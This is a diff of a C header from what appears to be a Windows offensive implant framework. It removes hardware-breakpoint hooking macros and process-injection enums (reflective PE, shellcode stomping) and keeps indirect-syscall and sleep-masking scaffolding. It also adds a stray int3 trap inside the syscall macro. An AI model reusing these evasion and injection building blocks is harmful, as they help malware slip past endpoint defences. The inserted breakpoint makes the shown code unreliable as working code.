@@ -23,61 +23,6 @@ typedef _STACK_FRAME STACK_FRAME;
         Ctx[i].Rip = (U_PTR)( p );                 \
     }
 
-/* ======== [ Hardware Breakpoint ] ======== */
-
-#define HW_ALL_THREADS 0x25
-
-enum {
-    Dr0,
-    Dr1,
-    Dr2,
-    Dr3
-} KH_DRX;
-
-typedef struct _DESCRIPTOR_HOOK {
-    ULONG  ThreadID;
-    HANDLE Handle;
-    BOOL   Processed;
-    INT8   Drx;
-    UPTR   Address;
-    PVOID This;
-    VOID ( *Detour )( PCONTEXT, PVOID );
-    struct _DESCRIPTOR_HOOK* Next;
-    struct _DESCRIPTOR_HOOK* Prev;
-} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;
-
-#define CONTINUE_EXEC( Ctx )( Ctx->EFlags = Ctx->EFlags | ( 1 << 16 ) )
-
-#ifdef _WIN64
-#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Rax = (UPTR)( Val ) ) )
-#elif  _WIN32
-#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Eax = (UPTR)( Val ) ) )
-#endif
-
-#define GET_ARG_1( Ctx ) ( Self->Hw->GetArg( Ctx, 0x1 ) )
-#define GET_ARG_2( Ctx ) ( Self->Hw->GetArg( Ctx, 0x2 ) )
-#define GET_ARG_3( Ctx ) ( Self->Hw->GetArg( Ctx, 0x3 ) )
-#define GET_ARG_4( Ctx ) ( Self->Hw->GetArg( Ctx, 0x4 ) )
-#define GET_ARG_5( Ctx ) ( Self->Hw->GetArg( Ctx, 0x5 ) )
-#define GET_ARG_6( Ctx ) ( Self->Hw->GetArg( Ctx, 0x6 ) )
-#define GET_ARG_7( Ctx ) ( Self->Hw->GetArg( Ctx, 0x7 ) )
-#define GET_ARG_8( Ctx ) ( Self->Hw->GetArg( Ctx, 0x8 ) )
-#define GET_ARG_9( Ctx ) ( Self->Hw->GetArg( Ctx, 0x9 ) )
-#define GET_ARG_A( Ctx ) ( Self->Hw->GetArg( Ctx, 0xA ) )
-#define GET_ARG_B( Ctx ) ( Self->Hw->GetArg( Ctx, 0xB ) )
-
-#define SET_ARG_1( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x1 ) )
-#define SET_ARG_2( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x2 ) )
-#define SET_ARG_3( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x3 ) )
-#define SET_ARG_4( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x4 ) )
-#define SET_ARG_5( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x5 ) )
-#define SET_ARG_6( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x6 ) )
-#define SET_ARG_7( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x7 ) )
-#define SET_ARG_8( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x8 ) )
-#define SET_ARG_9( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x9 ) )
-#define SET_ARG_A( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0xA ) )
-#define SET_ARG_B( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0xB ) )
-
 /* ======== [ Syscalls ] ======== */
 
 #define SY_SEED   0xEDB88320
@@ -122,24 +67,16 @@ asm volatile (  \
     : "r" (&Self->Sys->Ext[Self->Sys->Index].ssn), "r" (&Self->Sys->Ext[Self->Sys->Index].Instruction) \
     : "memory" \
 ); \
+asm("int3"); \
 y = ExecSyscall( __VA_ARGS__ ); \
 asm volatile ( \
     "pop r15\n\t" \
     "pop r14\n\t" \
 ); \
 
-EXTERN_C WINAPI NTSTATUS ExecSyscall( ... );
+EXTERN_C __fastcall NTSTATUS ExecSyscall( ... );
 
 /* ======== [ Injection ] ======== */
-
-enum {
-    PeReflection
-} KH_INJ_PE;
-
-enum {
-    ScClassic,
-    ScStomp
-} KH_INJ_SC;
 
 enum {
     MaskTimer = 1,
@@ -147,16 +84,11 @@ enum {
     MaskWait
 } KH_MASK;
 
-enum {
-    RegRax,
-    RegRsi,
-    RegRbx = 0x23
-} KH_REG;
-
-enum {
-    WkrClrCreateInstance,
-    WkrLoadLibraryA
-} WRK_CBACK;
+enum Reg {
+    eRax,
+    eRsi,
+    eRbx = 0x23
+};
 
 /* ========= [ Coff ] ========= */
 
